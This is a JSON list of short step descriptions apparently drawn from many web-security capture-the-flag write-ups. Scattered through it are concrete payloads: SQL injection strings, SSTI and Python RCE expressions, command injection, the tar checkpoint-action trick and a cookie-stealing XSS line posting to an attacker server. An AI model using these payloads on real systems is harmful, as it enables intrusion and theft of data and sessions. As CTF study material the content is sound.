[
    "Identified that the user input '$text' from get param 'text' was being used.",
    "Realized '$text' was passed into 'exec' leading to potential remote code execution.",
    "Input the payload to attempt to spawn a reverse shell.",
    "Identify that the vulnerability lies in Express query parsing",
    "Use 'window.localStorage.getItem' to check our input password against the split parts",
    "Insert 'blue}; input[type=\"password\"][value^=\"c\"] {background-image: url('https://example.com?c');' into the color input field",
    "Observe that the server script takes user input as the 'icecream' value.",
    "Observe that the server script uses a secure cookie for comparison to display a flag value.",
    "Successfully change the website content from the original message to the target flag value 'csictf{h3r3_i_4m}'.",
    "Understood how python pickles can be used for Remote Code Execution",
    "Realized that caching modules use 'pickle.load()' to load cached data",
    "Constructed a command to be executed",
    "Realize that the critical line could potentially lead to Remote Command Execution (RCE).",
    "Craft a payload for the attack.",
    "Open the Browser Devtools",
    "Use OR operator to guess the next character in the password",
    "If it does, append guessed character to 'flag' and continue process",
    "The author identifies it as a SQL Injection challenge.",
    "Para meters and values such as 'domain', 'check', 'key', and 'column' are initialized.",
    "Noticed that body-parser is set to allow arrays and objects",
    "Studied the official `mysql` docs",
    "Exploit the template injection vulnerability.",
    "Note the class index as 405.",
    "View the HTML source code.",
    "Realize that using string interpolation instead of object properties can lead to code injection vulnerabilities.",
    "Pass the 'username' value as ','\"member\":\"1' to the function in order to change the value of 'member' to 1.",
    "Devise a payload.",
    "Exploit the arbitrary JavaScript execution via a broken image tag's onerror handler.",
    "Notice the challenge is about Cross-Site Scripting (XSS).",
    "Craft an XSS payload.",
    "Base assumption on the upload page validation",
    "Access the provided source code and link to the running instance.",
    "Observe a visible SQL query for the login request.",
    "Recognize the visible SQL query as a potential vulnerability hint.",
    "Execute the query '123' UNION SELECT 1, sqlite_version(), 3;--'.",
    "Determine that the server's response suggests Server Side Template Injection.",
    "Access the template files on the server.",
    "Obtain the content of the template files.",
    "Checked the forgot password feature.",
    "Attempted to exploit the log4j vulnerability using the 'ProfileServlet.java'.",
    "Tried to get the flag using the code provided when exploiting the log4j vulnerability.",
    "Researched 'Code Execution through IIFE in node-serialize' advisory",
    "Researched what IIFE (Immediately Invoked Function Expression) is",
    "Injected a malicious payload into the file",
    "Developed a payload to read the flag file",
    "Attempt a Cross-site Scripting (XSS) attack.",
    "Realize that 'eval' can be triggered by entering a payload as the GET query parameter.",
    "Work out bugs in the Python code.",
    "Noticed the output of 'List Storage' command runs 'df -h'.",
    "Confirmed buttons trigger standard Linux commands.",
    "Constructed command '/santa_mon.sh \"curl http://localhost:3000/get_flag\"'.",
    "Identify the potential SSTI vulnerability.",
    "Exploit the SSTI vulnerability using ninjucks.",
    "Identify that the flag is in the same database as the toys, but its approved value is set to 0.",
    "Identify a potential vulnerability to SQL injection.",
    "The application connects to a sqlite database ('const db = new Database('toy_workshop.db');'), so inspect 'database.js'.",
    "This function adds our user provided query to the database and then calls 'bot.readQueries(db)'.",
    "This is a stored cross-site scripting vulnerability, where we can send a malicious script through the frontend to the database and when a user visits the '/queries' page, the server sends the malicious code to the user.",
    "We use a common XSS code: '<script>document.location='http://<ATTACKER_SERVER>?c='+document.cookie;</script>' to redirect to our webpage by changing the 'document.location' and setting the 'c' argument to 'document.cookie', which contains the current page's cookies.",
    "Use the Python subprocess library's getoutput() function.",
    "Submit the payload (__import__('subprocess').getoutput('cat /flag/flag.txt')).",
    "Notice that the value of FLAG_AUTH is starred out",
    "Discover that the 'auth' cookie was previously set in 'gethash.sh'",
    "Open the file index.html.",
    "Exploit PHP using loose comparison.",
    "Download app.py",
    "Open the website in a web browser",
    "Identify the first part of the flag within a comment",
    "To find the session cookie, set the session's 'admin' field to 'true'.",
    "Run a script with the site's 'secret key' included.",
    "Found no relevant information",
    "Ran code using URL 'http://web.chal.csaw.io:8000/?page=%27%20and%20die(show_source(%27templates/flag.php%27))%20or%20%27'",
    "Recognize the SQL injection vulnerability in the 'id' parameter",
    "Observe the usage of MySQL",
    "Utilize the group_concat() function",
    "Use '' OR 1=1;#' as password for SQL injection",
    "Use LFI to access the code of the 'delete' resource",
    "Extracted the flag from the response",
    "Analyze the application's token verification process",
    "Recognize that the `unserialize` function can lead to Remote Code Execution (RCE)",
    "Develop a Python script",
    "Implement the necessary steps to exploit the vulnerability",
    "Read the content of the /etc/flag.txt file",
    "Discover that the 'DB_SECRET' is stored in another table.",
    "Create a SQL injection payload.",
    "Identify that the code is using the HTTP header to construct a file path.",
    "Understand that '....//' can be used to bypass the replacement of '../'.",
    "Access the link 'http://35.207.189.79/pyserver/server.py'.",
    "Identify the server's functioning port and host from the extracted main execution function.",
    "Conclude that an image is necessary to exploit the service.",
    "Identify the password check code.",
    "Realize that the 'id' parameter can be manipulated.",
    "Create a client script based on packet structure knowledge.",
    "Analyze the challenge title for possible XSS vulnerability",
    "Craft a message with an XSS attack using an `img` tag",
    "Replace any 'secret' tags with the word 'Protected'.",
    "Defined SQL injection as the manipulation of a query to interact with a website's database.",
    "Understood that the application can be exploited via a XXE attack.",
    "Triggered the XML payload on the application.",
    "Construct a payload.",
    "Complete the payload.",
    "Analyze the HTML of the page.",
    "Analyze 'cgi-bin/' directory",
    "Identify 'scriptlet' vulnerability",
    "Identify Shellshock vulnerability",
    "Exploit Shellshock vulnerability",
    "Exploit Shellshock vulnerability",
    "Exploit Shellshock vulnerability",
    "Print contents of 'flag.file'",
    "Included a calculation statement in the request.",
    "Executed 'cat index.php' command.",
    "Execute 'cat index.php' command",
    "Wrote a Python script.",
    "Script composes the flag using the loop.",
    "Access 'login.php.bak'",
    "Make an educated guess on the numbers at the beginning of the MD5 string",
    "Implied a possibility of Cross-site Scripting (XSS)",
    "Execute the 'id' command remotely using the identified class",
    "Read the file 'flag210d9f88fd1db71b947fbdce22871b57.php' using the same technique applied during reading of 'config.php'",
    "Visit 'http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=flag210d9f88fd1db71b947fbdce22871b57.php'",
    "Use the 'git diff' command.",
    "Find the flag, which is meant to be in a file in the '/etc' directory",
    "Upload the new PHP exploit",
    "Used 'Updatexml()' in the SQL payload.",
    "Replace the email value in the intercepted Post Request with a controlled one.",
    "Identify the onclick track event",
    "Observe the 'get_user_info' method during authentication in the User class.",
    "Updated the '$url' attribute in the serialized object.",
    "Get link to the source code",
    "Craft a precise content payload",
    "Create a working XSS",
    "Discover a comment in the HTML source code referencing a potential vulnerability using TOTP",
    "Identify the existing user 'bob' from the authentication response",
    "Note that the post ID is sent as a URL fragment",
    "Crafted the SQL injection to directly pass 'flagman69' as the value for the username column using the 'UNION' clause.",
    "Implemented the newly crafted SQL injection on the authentication form.",
    "Find a way to bypass the remaining check.",
    "Extract the flag from the server response.",
    "Inject the command '127.0.0.1; ls -al' into the IP address field.",
    "Include a script for a basic alert in the uploaded LaTeX document",
    "Confirm vulnerability using the uploaded LaTeX document",
    "Note that the conditional statement sets a cookie with the true flag if certain values are present",
    "Inject the snippet (`EOC\n$eyes=`cat flag`;print '$eyes';`) through another HTTP POST request to /cow_designer.",
    "Observe that the flag is: `AOTW{th3_p3rl_c0w_s4ys_M0oO0o0O}`",
    "Identified a possible SQL injection vulnerability.",
    "Notice lack of content verification or removal of unwanted content",
    "Identify the SQL Injection vulnerability",
    "Generate payloads with the SQL query to extract each character of the token",
    "Identify code vulnerable to SQL injection in 'index.php'",
    "Opened 'last-revision', revealing the last update to the directory.",
    "Initialized a Bazaar repository within the 'ctf-bzr' directory",
    "Replace each integer into a URL.",
    "Call the web page.",
    "Exploit LFI vulnerability",
    "Obtain the process ID as the result of executing the PHP command",
    "Notice the website contains only a login form that might be vulnerable to SQL injection",
    "Determine that the 'counter' cookie string ends with a changing base64 encoded string",
    "Retrieve the JavaScript file from the webpage.",
    "Send the document cookies to an attacker-controlled server.",
    "Test the SQL injection vulnerability.",
    "Confirm that the SQL injection vulnerability exists.",
    "Find commit IDs within the log.",
    "Using the constructed base, tried to enumerate DB tables.",
    "Identified a potential SQL injection vulnerability.",
    "Understood the layout and elements of the webpage.",
    "Note that the debugging private key is '8EE86735658A9CE426EAF4E26BB0450E' and it is the MD5 of the string: 'fuckingdog'.",
    "Downloaded website source code",
    "Understood the requirement for a reflected XSS exploit",
    "Used DOM Clobbering technique",
    "Redefine `window.callback` and `trustedTypes` using the DOM Clobbering technique",
    "Due to the previous step, made an attempt to use an SQL injection on the challenge platform.",
    "Create a script to modify the sessionID to valid lua.",
    "Send a POST request to the /admin/system/refresh_session/ endpoint.",
    "Understand that dots, double slashes, or non-ascii dot are not allowed in the iframe value in the URL.",
    "Retrieve the X-Accel-Redirect header.",
    "The section tests payloads that can cause XSS if used with jQuery's html() method.",
    "Submit the script in the URL",
    "Figure out the XML External Entity (XXE) vulnerability in upload.php.",
    "Apply the base64 encoding filter to allow for file reading.",
    "Use the XML External Entity vulnerability to call the disguised phar file.",
    "Injected an 'a' tag.",
    "Identify the presence of a tripcode",
    "Determine that the tripcode is a part of an encrypted string",
    "Implement brute force for all possible remaining octets of the IP address within the range of 0 to 256",
    "Use YAML to analyze the script.",
    "Control 'Version' in cookie.",
    "Craft AJP Requests to be sent using Request Smuggling.",
    "Craft the AJP request to leak the source code of index.jsp.",
    "Inject CRLF characters in Lua's HTTP library.",
    "Identify a potential vulnerability within the function.",
    "Identify a SQL Injection vulnerability within the function.",
    "Appended `?source` to the index.php of the site.",
    "Discovered a connection being made to a MySQL server prior to shellcode execution.",
    "Verified the shellcode's functionality and ensured compatibility with the `strlen()` function within 'shellme()' in the `shellme.so` file.",
    "Identify the rendered HTML page from textarea inside an iframe",
    "Send an XSS to the pop-up",
    "Send an XSS with the stolen identifier",
    "Recognize that the sha512.js script will be filtered as a result of appending the parameter.",
    "Discover a potential for XSS injection.",
    "Assign different nonce to each script tag",
    "Begin to test this theory with 'handlebars', a tool which previously had a known vulnerability in processing templates.",
    "Consider whether this could present an entry point if a vulnerability, such as Template Injection, can be exploited successfully.",
    "Created a payload `\"><svg/onload=$.globalEval(name)` with length of '32 bytes'",
    "Assigned the payload by sending the admin to our webpage, where we triggered 'window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=\"><svg/onload=$.globalEval(name)', <long payload>)', setting 'window.name' to '<long payload>'",
    "Acknowledged the increased challenge in analyzing the code",
    "Noted the specific flag value: HarekazeCTF{j4v4scr1pt-0bfusc4t0r_1s_tsur41}",
    "Construct an SQL injection query based on the format.",
    "Identified a heavily filtered error-based blind sql injection.",
    "Test the SQL payload by iteratively substituting different lengths for '$LENGTH$'.",
    "Use the SQL function 'max(A, B)' to sort through the concatenated 152-digit number.",
    "Create a payload using functions that, when run, return 1337",
    "Check for a possibility of XSS injection in the CSRF token script.",
    "Overwrite document.domain using Object.defineProperty(document, 'domain', {value: 'yeunote.ctf.yeuchimse.com'});",
    "Recognized it as part of Angular's internal methods fetching '/api/answer' from server-side.",
    "Realized the mutation could be simplified to create the exploit.",
    "Perform the first DNS resolution to check if the destination is private.",
    "Perform the second DNS resolution to request the resource.",
    "Search for a script.js file.",
    "Perform the 'cat' command on '/home/user/flag.txt'.",
    "Identify that the formula points to another sheet's labeled 'Source'",
    "Identify the flag in the response section of that response.",
    "Inspect webpage response.",
    "Intercept register request.",
    "Realize the alternative method involves using SQL injection",
    "Attempt password brute force for each email",
    "Craft the payload with the SQL Injection and set it as the request body.",
    "Use the functions 'get_hidden' and 'get_passwords' in a brute-force attack to find the correct password for the username 'jack'.",
    "Send an SQL payload to the inaccessible server using SSTI to force the execution.",
    "Send the encoded script as an SSTI payload.",
    "Encode the script into base64 to bypass the filtering.",
    "Craft SQL injection payload",
    "Ensure payload always returns true",
    "Exploit the SQL injection vulnerability",
    "Use the 'requests' library to send HTTP GET requests.",
    "Create a for loop to iterate through the numbers from 1 to 20.",
    "Find that Vitepress running in dev mode enables CORS.",
    "Transmit it safely in an HTTP GET request to the attacker's server.",
    "Accessed the Cowsay as a Service Challenge website",
    "Used 'shell' as the setting name in the POST request",
    "The action of setting 'shell=true' made the command run within a shell",
    "Infer that Chrome is used for rendering JavaScript.",
    "Create an iframe within `exploit.html` with the source set to `http://localhost:3000/render?url=http://api:8000/`.",
    "Notice that the JWT token is checked in the response for '/localisation-file'.",
    "Verify that the 'language' parameter is indeed changed to 'flag.txt'.",
    "Recognize a Server-Side Template Injection (SSTI) vulnerability",
    "Identify the index of `<class 'subprocess.Popen'>` as 258",
    "Craft an SQL injection payload.",
    "Find that 'notes.count' is being executed through websockets.",
    "Identify the code normalizes file paths.",
    "Recognize the importance of bypassing file extension restrictions for a successful attack.",
    "Create the file '--checkpoint-action=exec=sh shell.txt'.",
    "Understand the purpose of this file: pollute the arguments for tar command.",
    "Reverse shell is obtained on the target system.",
    "Reveal mapping in the Apache configuration file.",
    "Passed the input to the injection point at 'GET /legacy_invoice_system/*'.",
    "Used the command 'sqlmap -r invoice.req --tamper tamper.py --threads 10 -T news_article --dump'.",
    "Described the 'words' table using the `1'; DESCRIBE tablename;` command.",
    "Described the '1919810931114514' table using the `1'; DESCRIBE tablename;` command.",
    "Used `1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM words');` to retrieve data from the 'words' table.",
    "Used ``1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM `1919810931114514`');`` to retrieve data from the '1919810931114514' table.",
    "The one-liner creates a malicious 'id' payload",
    "Read the 'flag.txt' file using the root shell",
    "Determine it potentially allows command injection.",
    "Check redirection in the window.",
    "Use the 'tryNumber' function.",
    "Implemented the UNION based SQL Injection",
    "Used 'username=test' or 1 UNION SELECT *, null from flag-- -&password=test' or 1 UNION SELECT *, null from flag-- -' as the injection payload",
    "Identify the POST request to /add for adding notes.",
    "Leverage a Local File Inclusion (LFI) vulnerability for Server Side Request Forgery (SSRF).",
    "Use a POST request to request 'file:///code/app.py'.",
    "Check if the value of <userID>_isAdmin key in Redis database is 'yes'.",
    "Craft a request to set the theme to '<?php phpinfo() ?>'.",
    "Identified potential vulnerabilities.",
    "Recognized that the user input is directly used in an SQL query.",
    "Identified lack of validation for 'Content-Length' headers as the cause of the vulnerability.",
    "Test basic payloads.",
    "Identify SQL injection is possible.",
    "Attempt SQL injection using MySQL comments in place of spaces.",
    "Test the SQL injections '/api/call_api.php?api=10.0.42.200/?search=admin_richard_lauren'/**/OR/**/'1'='1'.",
    "Test the SQL injections '/api/call_api.php?api=10.0.42.200/?search=admin_richard_lauren'/**/OR/**/'1'='2'.",
    "Write a script to bruteforce each of the hardcoded cookie names.",
    "Use hashlib, URLSafeTimedSerializer and TimestampSigner in Python.",
    "Started testing for potential XPath injection points in the application.",
    "Uploaded a PHP file to the server.",
    "Wrote the final payload.",
    "Incorporated the PHP 'disable_functions' bypass exploit.",
    "Crafted an SQL injection payload bypassing the filter limit",
    "Modified 'X-Forwarded-For' header value.",
    "Attempted to use ' in the username parameter.",
    "Retrieved data from 'R34L_F14G' column in 'users_data' table.",
    "Automated a bruteforce attack with a Python script.",
    "Launched the attack script on the new GitHub Pages site.",
    "Identify the exposed '.git' directory",
    "Identify the flag exposed within 'app.py'",
    "Upload a PHP webshell.",
    "Recognize that the 'guest' cookie is base 64 decoded in the deserialization process.",
    "Identified the prototype pollution vulnerability.",
    "Identified how to leverage the prototype pollution.",
    "Analyze the response headers.",
    "Refer to the downloaded JSON to understand the functionality of the `/new` endpoint.",
    "Use the gained reverse shell.",
    "Notice that the entered URLs are rendered by a Chromium instance.",
    "Use the Promise to try and load a URL.",
    "Attempt to send this information to a remote server.",
    "Set up a remote server for this purpose.",
    "Receive the port number from the exfiltration attempt.",
    "Send JavaScript code to the browser instance.",
    "Looked for potential vulnerabilities in the search function.",
    "Explored potential SQL Injection through string manipulation.",
    "Noted the validation preventing 'localhost' or '127.0.0.1'.",
    "Identified parameters in the WebSocket message.",
    "Recognized that the parameters in the WebSocket message could be modified.",
    "Realized that modifying the parameters allows callback to our server.",
    "Used Remote Flutter Widgets package for decoding.",
    "Identified the specified `apiGet` URL.",
    "Triggered the `api_post` event.",
    "Develop the XSS payload using <img src='x' onerror='PAYLOAD'>.",
    "Execute our malicious JavaScript code when the page loads.",
    "Recognize that the Origin request header comprises the webpage URL in the format: ://hostname:port.",
    "Extract 'P4s5_w0Rd' string using regex pattern.",
    "Index characters of 'P4s5_w0Rd' string.",
    "Further exploited the SSTI vulnerability by crafting a URL that would read the contents of a 'flag.txt' file on the server using built-in Python functions within the Jinja2 template.",
    "Check the 6th character of the flag in the SQL database",
    "Test characters against the SQL injection",
    "Crafted an HTML payload for exploiting this vulnerability",
    "Exploit the XSS vulnerability to send a POST request.",
    "Implemented the attack using 'Lazy-loading' property.",
    "Discovered that CSS attribute selectors can be used for exfiltration.",
    "Confirmed that the URL specified in the 'background' property is fetched conditionally.",
    "Convert items in a dictionary to a list using 'list'.",
    "Build Remote Code Execution (RCE) payload using '().__class__.__subclasses__.__getitem__(x)' method.",
    "Write a script that creates an 'img' element with src set to contain the 'document.cookie' value.",
    "Redirected the PHP script to the target URL after 19 redirects.",
    "Recognized that 'text/xsl' can potentially allow Cross-Site Scripting.",
    "Realized the input was being reflected into an XSL document.",
    "Noted that 'text/xsl' indicated potential for Cross-Site Scripting.",
    "Utilized 'x:script' to exploit the vulnerability.",
    "Mutable objects within namedtuple and tuple can still be modified.",
    "Note the possibility of command injection in the 'execSync' call.",
    "Decide to pollute 'process.argv[2]' with a command injection payload.",
    "Weak point: negative flag price not validated in 'sellFlag' function",
    "Exploit: apply negative price when selling a flag",
    "Identified that a successful password reset would set 'user.active' to 'True', activating the user account.",
    "Render the XSS payload: '<img src=\"/images/error.jpg\" alt=\"selected category random\"onerror=\"alert``\" />'",
    "Validate the files with SHA256 sums",
    "The 'minimag' and 'bbcode' commands are used for parsing content into HTML in the post_view.tpl file",
    "The alert in the browser indicates a Cross-Site Scripting (XSS) vulnerability",
    "'smtp_exec' variable is used in sending activation emails",
    "The usage of 'smtp_exec' indicates that Remote Code Execution (RCE) could be possible",
    "The attack then initiates RCE to read and externally send the flag",
    "Bypass standard checks by exploiting the off-by-one error",
    "Identify HTTP request smuggling as the first obstacle.",
    "Understand that the URL rewriting is done using the host header",
    "Understand that the mechanism validates the URL format",
    "Identify that the JavaScript library is vulnerable to client-side prototype pollution.",
    "Ensure that 'usernameLength' is empty through the query string.",
    "Use 'window.open()' on the exploit server.",
    "Fetch the flag using 'innerHTML'.",
    "Identified a suitable breakpoint after the `malloc` call and before the `strcpy` call."
]